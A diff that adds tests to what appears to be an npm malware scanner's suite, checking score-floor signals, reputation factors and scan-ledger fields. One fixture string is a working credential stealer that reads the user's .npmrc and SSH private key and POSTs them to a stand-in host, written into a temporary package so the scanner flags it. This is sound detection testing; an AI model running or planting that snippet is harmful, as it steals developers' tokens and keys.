@@ -342,10 +342,103 @@ async function runScanLedgerTests() {
     } finally { try { fs.unlinkSync(f); } catch {} }
   });
 
+  await runFloorCalibrationTests();
+
   // Reset env + module cache so other suites get production defaults, not the test path.
   delete process.env.MUADDIB_SCAN_LEDGER_FILE;
   delete process.env.MUADDIB_SCAN_LEDGER_MAX;
   delete require.cache[require.resolve('../../src/monitor/state.js')];
+}
+
+// Score-floor calibration fields: floorSignals (scoring.js), the scores kept before the
+// mature-package cap and the reputation factor (processor.js), ledgerFloorFields (queue.js)
+// and their ledger line (state.js). Read-only: the final score must not change.
+async function runFloorCalibrationTests() {
+  const { floorSignals } = require('../../src/scoring.js');
+  const { ledgerFloorFields } = require('../../src/monitor/queue.js');
+  const { run } = require('../../src/index.js');
+
+  test('floorSignals: qualifying floor type, floor type lowered by a reduction, none', () => {
+    const r = floorSignals([
+      { type: 'lifecycle_shell_pipe', severity: 'CRITICAL', file: 'package.json' },
+      { type: 'crypto_exfil', severity: 'LOW', originalSeverity: 'CRITICAL', file: 'lib/a.js',
+        reductions: [{ rule: 'dist_file', from: 'CRITICAL', to: 'HIGH' }, { rule: 'unreachable', from: 'HIGH', to: 'LOW' }] },
+      { type: 'env_access', severity: 'HIGH', file: 'lib/a.js' }
+    ]);
+    assert(r && r.sf.join() === 'lifecycle_shell_pipe', 'qualifying floor type: ' + JSON.stringify(r));
+    assert(r.sfReduced.length === 1 && r.sfReduced[0].type === 'crypto_exfil' && r.sfReduced[0].rules.join() === 'dist_file,unreachable',
+      'reduced floor type with its rules: ' + JSON.stringify(r.sfReduced));
+    assert(floorSignals([{ type: 'env_access', severity: 'HIGH' }, { type: 'obfuscation_detected', severity: 'CRITICAL' }]) === null,
+      'no floor type and no confirmed malice: null');
+  });
+
+  test('floorSignals: a type below its own gate originally is not reported as reduced', () => {
+    // ioc_string_match floors only at CRITICAL: a HIGH one, lowered or not, never qualified.
+    const r = floorSignals([{ type: 'ioc_string_match', severity: 'LOW', originalSeverity: 'HIGH', reductions: [{ rule: 'unreachable' }] }]);
+    assert(r === null, 'HIGH string IOC never reached the floor gate: ' + JSON.stringify(r));
+    const u = floorSignals([{ type: 'ioc_string_match', severity: 'CRITICAL', iocUncorroborated: true }]);
+    assert(u === null, 'uncorroborated string IOC is not a floor signal');
+  });
+
+  const credFiles = "const fs=require('fs'),os=require('os');const a=fs.readFileSync(os.homedir()+'/.npmrc','utf8');const b=fs.readFileSync(os.homedir()+'/.ssh/id_rsa','utf8');require('https').request({hostname:'collector.example-exfil.net',method:'POST',path:'/u'}).end(a+b);\n";
+  const established = {
+    latest_version: '2.0.1', scan_version: '2.0.1', registry_version: '2.0.1', dist_tags: { latest: '2.0.1' }, maintainer_emails: [],
+    time: { '1.0.0': '2019-01-01T00:00:00.000Z', '2.0.1': '2026-11-20T10:00:00.000Z' }, created_at: '2019-01-01T00:00:00.000Z',
+    age_days: 2880, weekly_downloads: 500000, version_count: 180, author_package_count: 40,
+    has_readme: true, has_repository: true, readme_size: 8000, stable_ownership_2y: true
+  };
+  const scan = async (meta) => {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-floorcal-'));
+    try {
+      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'floorcal-x', version: '2.0.1', main: 'index.js' }));
+      fs.writeFileSync(path.join(dir, 'index.js'), credFiles);
+      const opts = { _capture: true };
+      if (meta) opts.npmRegistryMeta = meta;
+      return await run(dir, opts);
+    } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+  };
+
+  await asyncTest('floor calibration: established package keeps the scores before the mature cap and the reputation factor', async () => {
+    const plain = await scan(null);
+    const est = await scan(established);
+    const s = est.summary;
+    assert(typeof s.matureCapFrom === 'number' && s.matureCapFrom === plain.summary.riskScore,
+      `score before the mature cap = registry-free score (${plain.summary.riskScore}), got ${s.matureCapFrom}`);
+    assert(typeof s.preReputationScore === 'number' && s.reputationFactor < 1 && s.riskScore < s.preReputationScore,
+      `score before the factor kept: pre=${s.preReputationScore} factor=${s.reputationFactor} final=${s.riskScore}`);
+    assert(!('matureCapFrom' in plain.summary) && !('preReputationScore' in plain.summary), 'no registry metadata: no field');
+  });
+
+  await asyncTest('floor calibration: ledger line carries the fields for an adjusted scan, none for a plain one', async () => {
+    const f = path.join(os.tmpdir(), `ledger-${Date.now()}-floor.jsonl`);
+    try {
+      const est = await scan(established);
+      const plain = await scan(null);
+      const s = freshState(f);
+      s.appendScanLedger({ name: 'est', outcome: 'clean', score: est.summary.riskScore, ...ledgerFloorFields(est) });
+      s.appendScanLedger({ name: 'plain', outcome: 'suspect', score: plain.summary.riskScore, ...ledgerFloorFields(plain) });
+      const reduced = { summary: { riskScore: 10 }, threats: [{ type: 'crypto_exfil', severity: 'LOW', originalSeverity: 'CRITICAL', reductions: [{ rule: 'unreachable' }] }] };
+      s.appendScanLedger({ name: 'reduced', outcome: 'clean', score: 10, ...ledgerFloorFields(reduced) });
+      const byName = Object.fromEntries(s.loadScanLedger().map(r => [r.name, r]));
+      const fl = byName.reduced.floor;
+      assert(fl && fl.sf.length === 0 && fl.sfReduced[0].type === 'crypto_exfil' && fl.sfReduced[0].rules.join() === 'unreachable',
+        'floor signals on the ledger line: ' + JSON.stringify(byName.reduced));
+      const e = byName.est;
+      assert(e.repFactor === Math.round(est.summary.reputationFactor * 1000) / 1000 && e.preRepScore === est.summary.preReputationScore,
+        'reputation factor and score before it: ' + JSON.stringify(e));
+      assert(e.matureCapFrom === est.summary.matureCapFrom && e.hc === true, 'mature cap origin and HIGH/CRITICAL gate: ' + JSON.stringify(e));
+      const p = byName.plain;
+      for (const k of ['repFactor', 'preRepScore', 'matureCapFrom', 'hc']) assert(!(k in p), `plain scan has no ${k}: ` + JSON.stringify(p));
+    } finally { try { fs.unlinkSync(f); } catch {} }
+  });
+
+  test('ledgerFloorFields: floor signals written alone, factor 1 and missing summary write nothing', () => {
+    const withFloor = ledgerFloorFields({ summary: { riskScore: 75 }, threats: [{ type: 'lifecycle_shell_pipe', severity: 'CRITICAL' }] });
+    assert(withFloor.floor && withFloor.floor.sf.join() === 'lifecycle_shell_pipe' && !('hc' in withFloor), JSON.stringify(withFloor));
+    const neutral = ledgerFloorFields({ summary: { riskScore: 30, reputationFactor: 1, high: 1 }, threats: [] });
+    assert(Object.keys(neutral).length === 0, 'factor 1.0: nothing written ' + JSON.stringify(neutral));
+    assert(Object.keys(ledgerFloorFields(null)).length === 0 && Object.keys(ledgerFloorFields({})).length === 0, 'no summary: nothing');
+  });
 }
 
 module.exports = { runScanLedgerTests };
